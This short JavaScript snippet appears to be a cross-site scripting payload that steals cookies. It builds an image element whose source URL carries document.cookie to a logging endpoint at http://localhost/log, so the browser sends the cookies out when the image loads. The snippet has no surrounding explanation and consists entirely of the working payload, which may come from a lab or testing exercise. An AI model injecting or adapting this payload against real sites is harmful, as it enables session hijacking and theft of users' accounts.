var img = document.createElement("img");
img.src = "http://localhost/log?"+escape(document.cookie);
document.body.appendChild(img);